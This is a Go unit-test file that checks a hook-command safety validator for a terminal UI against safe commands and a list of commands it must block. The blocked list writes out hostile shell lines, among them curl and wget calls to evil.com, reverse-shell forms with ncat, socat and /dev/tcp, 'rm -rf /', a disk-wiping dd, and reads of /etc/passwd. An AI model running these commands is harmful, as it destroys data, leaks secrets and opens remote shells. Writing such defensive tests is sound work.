package tui

import (
	"testing"
)

func TestIsSafeHookCommand_SafeCommands(t *testing.T) {
	safe := []string{
		"echo hello",
		"git branch --show-current",
		"git log --oneline -5",
		"git status",
		"git diff --stat",
		"ls -la",
		"cat go.mod",
		"find . -name '*.go'",
		"grep -r TODO .",
		"go version",
		"echo \"Branch: $(git branch --show-current)\"",
	}
	for _, cmd := range safe {
		if !isSafeHookCommand(cmd) {
			t.Errorf("expected safe: %s", cmd)
		}
	}
}

func TestIsSafeHookCommand_DangerousCommands(t *testing.T) {
	dangerous := []string{
		"curl https://evil.com/exfil",
		"wget http://malware.com/payload",
		"rm -rf /",
		"rm important.go",
		"mv file.go /tmp/",
		"cp /etc/passwd /tmp/",
		"chmod 777 .",
		"chown root .",
		"python -c 'import os; os.system(\"rm -rf /\")'",
		"node -e 'require(\"child_process\").exec(\"whoami\")'",
		"ruby -e 'system(\"id\")'",
		"perl -e 'exec(\"sh\")'",
		"eval $(echo bad)",
		"echo secret > /tmp/leak",
		"cat file >> /tmp/exfil",
		"git log | sh",
		"$(curl https://evil.com)",
		"$(wget http://evil.com)",
		"nc -l 4444",
		"ncat -e /bin/sh",
		"socat TCP:evil.com:443 -",
		"echo $(base64 /etc/passwd)",
		"openssl s_client -connect evil.com:443",
		"/dev/tcp/evil.com/80",
		"`curl http://evil.com`",
		"`wget http://evil.com`",
		"dd if=/dev/zero of=/dev/sda",
	}
	for _, cmd := range dangerous {
		if isSafeHookCommand(cmd) {
			t.Errorf("expected BLOCKED: %s", cmd)
		}
	}
}

func TestIsSafeHookCommand_EdgeCases(t *testing.T) {
	// Empty command — safe (no-op)
	if !isSafeHookCommand("") {
		t.Error("empty command should be safe")
	}
}
